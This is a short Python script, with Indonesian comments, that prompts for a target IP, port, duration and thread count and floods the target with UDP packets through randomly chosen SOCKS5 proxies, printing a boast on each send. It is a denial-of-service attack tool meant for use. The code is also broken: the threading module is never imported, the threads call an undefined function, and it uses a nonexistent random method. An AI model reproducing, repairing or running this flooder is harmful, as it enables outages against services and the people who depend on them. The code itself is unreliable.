import socket, socks
import struct
import random, os, requests
from time import time as tt


ip = str(input("IP : "))
port = int(input("Port : "))
time = int(input("Time : "))
threads = int(input("Threads : "))

def UDP():
	# Baca daftar proxy dari file
    with open("proxy.txt") as file:
    	  proxy_list = [line.strip().split(":") for line in file]

    # Pilih proxy berikutnya secara acak
    next_proxy = random.choice(proxy_list)

    # Set konfigurasi proxy berikutnya
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, next_proxy[0], int(next_proxy[1]))
    size = random._unrandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:
        endtime = tt()
        if (startup + time) < endtime:
            break
         
        print("[!] SUKSES WKWK => ",ip," : ",port,"!")
        s.connect((ip, port))
        s.sendto(size, addr)


for y in range(threads):
    th = threading.Thread(target = run)
    th.start()